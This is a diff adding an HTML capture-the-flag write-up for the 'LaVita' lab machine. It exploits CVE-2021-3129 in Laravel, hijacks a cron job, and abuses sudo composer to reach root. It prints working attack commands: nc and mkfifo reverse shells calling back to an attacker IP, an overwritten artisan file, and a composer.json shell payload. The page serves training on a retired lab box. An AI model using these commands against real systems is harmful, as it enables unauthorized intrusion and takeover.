@@ -1,0 +1,120 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>LaVita &middot; Writeups</title>
+<link rel="stylesheet" href="style.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/styles/atom-one-dark.min.css">
+</head>
+<body>
+<header class="topbar">
+  <a class="home" href="./index.html">&larr; all writeups</a>
+  <span class="brand">SAMSON &middot; CTF</span>
+</header>
+<main class="article">
+  <div class="boxhead">
+    <div class="bh-left">
+      <span class="badge pg">PG</span>
+      <span class="badge os">Linux</span>
+      <span class="badge deep">in-depth</span>
+    </div>
+    <h1>LaVita</h1>
+    <div class="meta">Target: <code>192.168.206.38</code></div>
+    <div class="tags"><span class="tag">Linux</span><span class="tag">Laravel</span><span class="tag">CVE-2021-3129</span><span class="tag">RCE</span><span class="tag">Deserialization</span><span class="tag">CronJob</span><span class="tag">Composer</span><span class="tag">GTFOBins</span><span class="tag">sudo</span></div>
+  </div>
+  <div class="layout">
+    <nav class="toc"><a class="lvl2" href="#overview">Overview</a><a class="lvl2" href="#recon">Recon</a><a class="lvl3" href="#port-scan">Port Scan</a><a class="lvl3" href="#web-enumeration">Web Enumeration</a><a class="lvl2" href="#foothold">Foothold</a><a class="lvl3" href="#cve-2021-3129-laravel-debug-mode-rce">CVE-2021-3129, Laravel Debug Mode RCE</a><a class="lvl2" href="#privilege-escalation">Privilege Escalation</a><a class="lvl3" href="#cron-job-hijack-www-data-to-skunk">Cron Job Hijack, www-data to skunk</a><a class="lvl3" href="#sudo-composer-skunk-to-root">sudo composer, skunk to root</a><a class="lvl2" href="#root">Root</a><a class="lvl2" href="#takeaways">Takeaways</a></nav>
+    <article class="body"><h2 id="overview">Overview</h2>
+<p>LaVita runs a Laravel 8.4.0 web application with debug mode accessible post-registration, making it vulnerable to CVE-2021-3129, an unauthenticated (post-auth) deserialization RCE via the Ignition debug endpoint. Getting a shell as <code>www-data</code> is just the start: a cron job runs an <code>artisan</code> PHP file as a different user, and that file is replaceable. The resulting user account has sudo rights to <code>composer</code>, which GTFOBins turns into a root shell through a collaborative two-shell technique.</p>
+<h2 id="recon">Recon</h2>
+<h3 id="port-scan">Port Scan</h3>
+<pre><code class="language-sh">PORT   STATE SERVICE VERSION
+22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u2 (protocol 2.0)
+80/tcp open  http    Apache httpd 2.4.56 ((Debian))
+</code></pre>
+<h3 id="web-enumeration">Web Enumeration</h3>
+<p>Gobuster on port 80:</p>
+<pre><code class="language-sh">gobuster dir -u http://192.168.206.38/ -w /home/kali/Tools/SecLists/Discovery/Web-Content/big.txt -x php
+/login                (Status: 200)
+/register             (Status: 200)
+/home                 (Status: 302) [--&gt; /login]
+/robots.txt           (Status: 200)
+</code></pre>
+<p>An error page from the application exposed the backend framework: <strong>Laravel 8.4.0</strong>.</p>
+<h2 id="foothold">Foothold</h2>
+<h3 id="cve-2021-3129-laravel-debug-mode-rce">CVE-2021-3129, Laravel Debug Mode RCE</h3>
+<p>Laravel 8.4.0 with debug mode enabled is vulnerable to CVE-2021-3129, a deserialization attack through the <code>/_ignition/execute-solution</code> endpoint. The exploit requires an account to trigger debug mode, so I registered one, then ran the exploit script from GitHub (joshuavanderpoll/CVE-2021-3129), which brute-forces the Laravel log file path and chains PHPGGC gadget payloads:</p>
+<pre><code class="language-sh">python3 laravel.py --host=&quot;http://192.168.206.38&quot;
+[@] Testing vulnerable URL &quot;http://192.168.206.38/_ignition/execute-solution&quot;...
+[√] Host seems vulnerable!
+[√] Laravel log path: &quot;/var/www/html/lavita/storage/logs/laravel.log&quot;
+[•] Laravel version found: &quot;8.4.0&quot;
+</code></pre>
+<blockquote>
+<p><strong>How CVE-2021-3129 works:</strong> Ignition, Laravel's debug handler, has a <code>MakeViewBladeWithErrors</code> solution that writes a PHP deserialization payload into the application log and then includes that log file. Because PHP's unserialise processes the payload during inclusion, and PHPGGC provides Laravel-specific RCE gadget chains, this turns the debug endpoint into arbitrary code execution. Debug mode is required, but any registered user can enable it.</p>
+</blockquote>
+<p>The exploit only reliably runs one command per invocation. I restarted the script and used the single execution window to send a reverse shell:</p>
+<pre><code class="language-sh">[?] Please enter a command to execute: execute nc 192.168.45.167 80 -e /bin/bash
+</code></pre>
+<pre><code class="language-sh">rlwrap nc -lvnp 80
+connect to [192.168.45.167] from (UNKNOWN) [192.168.206.38] 49248
+whoami
+www-data
+</code></pre>
+<p>TTY upgrade:</p>
+<pre><code class="language-sh">python3 -c 'import pty; pty.spawn(&quot;/bin/bash&quot;)'
+</code></pre>
+<h2 id="privilege-escalation">Privilege Escalation</h2>
+<h3 id="cron-job-hijack-www-data-to-skunk">Cron Job Hijack, www-data to skunk</h3>
+<p>LinPEAS and <code>pspy32s</code> revealed a cron job running as UID 1001 (<code>skunk</code>):</p>
+<pre><code class="language-sh">CMD: UID=1001  PID=17307  | /usr/bin/php /var/www/html/lavita/artisan clear:pictures
+</code></pre>
+<p>The <code>artisan</code> file is in the Laravel web root, which <code>www-data</code> owns. I removed the original and replaced it with a PHP reverse shell:</p>
+<pre><code class="language-sh">echo &quot;&lt;?php system('rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&gt;&amp;1|nc 192.168.45.167 4444&gt;/tmp/f'); ?&gt;&quot; &gt; artisan
+</code></pre>
+<p>When the cron triggered, a shell came back as <code>skunk</code>:</p>
+<pre><code class="language-sh">rlwrap nc -lvnp 4444
+connect to [192.168.45.167] from (UNKNOWN) [192.168.206.38] 47772
+$ whoami
+skunk
+</code></pre>
+<p><code>id</code> showed <code>skunk</code> is in the <code>sudo</code> group:</p>
+<pre><code class="language-sh">uid=1001(skunk) gid=1001(skunk) groups=1001(skunk),27(sudo),33(www-data)
+</code></pre>
+<h3 id="sudo-composer-skunk-to-root">sudo composer, skunk to root</h3>
+<p><code>sudo -l</code> as <code>skunk</code>:</p>
+<pre><code class="language-sh">(ALL : ALL) ALL
+(root) NOPASSWD: /usr/bin/composer --working-dir=/var/www/html/lavita *
+</code></pre>
+<p><code>skunk</code> cannot write to <code>/var/www/html/lavita</code>, but <code>www-data</code> can. This requires coordinating between the two shells. In the <code>www-data</code> shell, I replaced <code>composer.json</code> with a GTFOBins payload:</p>
+<pre><code class="language-sh">echo '{&quot;scripts&quot;:{&quot;x&quot;:&quot;/bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3&quot;}}' &gt; composer.json
+</code></pre>
+<p>Back in the <code>skunk</code> shell, I ran the script:</p>
+<pre><code class="language-sh">sudo /usr/bin/composer --working-dir=/var/www/html/lavita run-script x
+Do not run Composer as root/super user! See https://getcomposer.org/root for details
+Continue as root/super user [yes]? yes
+&gt; /bin/sh -i 0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3
+# whoami
+root
+</code></pre>
+<blockquote>
+<p><strong>Why the composer GTFOBins method works:</strong> <code>composer run-script</code> executes the script value as a shell command. Running it via <code>sudo</code> makes the shell spawn as root. The FD redirection (<code>0&lt;&amp;3 1&gt;&amp;3 2&gt;&amp;3</code>) attaches the shell's stdin/stdout/stderr to FD 3, which is the existing TTY.</p>
+</blockquote>
+<h2 id="root">Root</h2>
+<pre><code class="language-sh"># cat proof.txt
+‹redacted›
+</code></pre>
+<h2 id="takeaways">Takeaways</h2>
+<ul>
+<li><strong>CVE-2021-3129 is a single-command-per-run quirk.</strong> Restart the exploit script and burn the one execution window on a reverse shell rather than an <code>id</code> check.</li>
+<li><strong><code>pspy</code> catches cron jobs that <code>crontab -l</code> hides.</strong> The <code>skunk</code> cron wasn't in any readable crontab; process watching was the only way to find it.</li>
+<li><strong>Two-shell privilege escalation is valid technique.</strong> When one account has write access and another has sudo, coordinate them: write the payload as the writer, trigger it as the sudo user.</li>
+<li><strong>GTFOBins <code>composer</code> entry works cleanly with <code>run-script</code>.</strong> The FD redirect handles TTY attachment without needing a separate listener.</li>
+</ul></article>
+  </div>
+</main>
+<footer class="foot">Samson Laird &middot; retired-machine writeups &middot; secrets redacted</footer>
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/11.9.0/highlight.min.js"></script>
+<script>hljs.highlightAll();</script>
+</body>
+</html>
